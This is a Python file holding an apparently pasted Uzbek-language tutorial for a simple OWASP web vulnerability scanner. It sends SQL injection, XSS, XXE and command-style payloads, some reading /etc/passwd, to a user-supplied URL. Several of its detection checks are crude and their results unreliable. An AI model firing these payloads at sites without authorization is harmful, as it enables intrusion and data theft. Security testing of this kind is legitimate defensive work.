# -*- coding: utf-8 -*-
"""
Created on Mon Jul  1 23:09:57 2024

@author: Acer
"""

Veb Sayt Zaifliklarini Topuvchi Mukammal Dastur Yaratish
Yuqoridagi dasturga qo'shimcha ravishda, boshqa OWASP Top 10 zaifliklarni ham tekshirish uchun funksiyalar qo'shamiz. Dastur endi quyidagi zaifliklarni tekshiradi:

SQL Injection
XSS (Cross-Site Scripting)
CSRF (Cross-Site Request Forgery)
Security Headers
XXE (XML External Entities)
Insecure Deserialization
Sensitive Data Exposure
Misconfiguration
Insufficient Logging & Monitoring
1. Dastur Talablari
Kutubxonalar:
requests: HTTP so'rovlar uchun.
BeautifulSoup: HTML tahlili uchun.
re: Regular expressions (muntazam ifodalar) uchun.
urllib: URL'larni boshqarish uchun.
xml.etree.ElementTree: XML tahlili uchun.
json: JSON tahlili uchun.
2. Dastur Kodini Yozish
python
Копировать код
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin
import xml.etree.ElementTree as ET
import json

# SQL Injection zaifligini tekshirish
def check_sql_injection(url):
    sql_payloads = ["'", "' OR 1=1--", '" OR 1=1--']
    vulnerable = False

    for payload in sql_payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if "syntax" in response.text or "SQL" in response.text:
            print(f"Potential SQL Injection vulnerability detected at: {test_url}")
            vulnerable = True

    return vulnerable

# XSS (Cross-Site Scripting) zaifligini tekshirish
def check_xss(url):
    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    vulnerable = False

    for payload in xss_payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if payload in response.text:
            print(f"Potential XSS vulnerability detected at: {test_url}")
            vulnerable = True

    return vulnerable

# CSRF (Cross-Site Request Forgery) zaifligini tekshirish
def check_csrf(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    vulnerable = False

    for form in forms:
        if not form.find('input', {'name': 'csrf_token'}):
            print(f"Potential CSRF vulnerability detected in form at: {url}")
            vulnerable = True

    return vulnerable

# Headerlarda xavfsizlik tekshiruvlari
def check_security_headers(url):
    response = requests.get(url)
    headers = response.headers
    security_headers = ["Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options", "Strict-Transport-Security"]
    missing_headers = [header for header in security_headers if header not in headers]

    if missing_headers:
        print(f"Missing security headers: {missing_headers}")
        return False
    return True

# XXE (XML External Entities) zaifligini tekshirish
def check_xxe(url):
    xxe_payload = """<?xml version="1.0"?>
    <!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=xxe_payload, headers=headers)

    if "root:x" in response.text:
        print(f"Potential XXE vulnerability detected at: {url}")
        return True
    return False

# Insecure Deserialization zaifligini tekshirish
def check_insecure_deserialization(url):
    payload = {'key': '__import__("os").system("cat /etc/passwd")'}
    response = requests.post(url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})

    if "root:x" in response.text:
        print(f"Potential Insecure Deserialization vulnerability detected at: {url}")
        return True
    return False

# Sensitive Data Exposure zaifligini tekshirish
def check_sensitive_data_exposure(url):
    response = requests.get(url)
    if "password" in response.text or "credit card" in response.text:
        print(f"Potential Sensitive Data Exposure detected at: {url}")
        return True
    return False

# Security Misconfiguration zaifligini tekshirish
def check_security_misconfiguration(url):
    response = requests.get(url)
    if "phpinfo" in response.text or "server at" in response.text:
        print(f"Potential Security Misconfiguration detected at: {url}")
        return True
    return False

# Insufficient Logging and Monitoring zaifligini tekshirish (log fayllarni qidirish)
def check_insufficient_logging(url):
    response = requests.get(urljoin(url, "/log"))
    if response.status_code == 200 and "log" in response.text:
        print(f"Potential Insufficient Logging and Monitoring detected at: {url}")
        return True
    return False

# Bosh sahifa orqali barcha zaifliklarni tekshirish
def check_all(url):
    print(f"Checking vulnerabilities for: {url}")
    if check_sql_injection(url):
        print("SQL Injection detected.")
    else:
        print("No SQL Injection detected.")
    
    if check_xss(url):
        print("XSS detected.")
    else:
        print("No XSS detected.")
    
    if check_csrf(url):
        print("CSRF detected.")
    else:
        print("No CSRF detected.")
    
    if check_security_headers(url):
        print("All necessary security headers are present.")
    else:
        print("Missing some security headers.")
    
    if check_xxe(url):
        print("XXE detected.")
    else:
        print("No XXE detected.")
    
    if check_insecure_deserialization(url):
        print("Insecure Deserialization detected.")
    else:
        print("No Insecure Deserialization detected.")
    
    if check_sensitive_data_exposure(url):
        print("Sensitive Data Exposure detected.")
    else:
        print("No Sensitive Data Exposure detected.")
    
    if check_security_misconfiguration(url):
        print("Security Misconfiguration detected.")
    else:
        print("No Security Misconfiguration detected.")
    
    if check_insufficient_logging(url):
        print("Insufficient Logging and Monitoring detected.")
    else:
        print("No Insufficient Logging and Monitoring detected.")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    check_all(target_url)
Qo'shimcha Qadamlar
Dasturdan Foydalanish:

Dasturni ishga tushirish va tekshirish uchun terminal yoki konsoldan foydalaning.
target_url ni kiritib, tekshirish jarayonini boshlang.
Kengaytirish:

OWASP Top 10 ro'yxatidagi boshqa zaifliklarni ham qo'shing.
Masalan, Server-Side Request Forgery (SSRF) va boshqalarni tekshirish funksiyalarini yozing.
Xavfsizlik Choralariga E'tibor Bering:

Testlarni haqiqiy ishlab chiqarish muhitida amalga oshirmang.
Ruxsatnomasiz testlarni amalga oshirishdan saqlaning.
Xulosa
Yuqoridagi dastur veb saytdagi zaifliklarni aniqlash uchun kengaytirilgan va takomillashtirilgan. Dasturni kengaytirish va takomillashtirish orqali ko'proq zaifliklarni tekshirish imkoniyatini qo'shishingiz mumkin. Har qanday zaiflikni topish uchun turli usullar va vositalardan foydalanishingiz mumkin, shuningdek, qonuniy va xavfsizlik masalalariga e'tibor berishingiz kerak.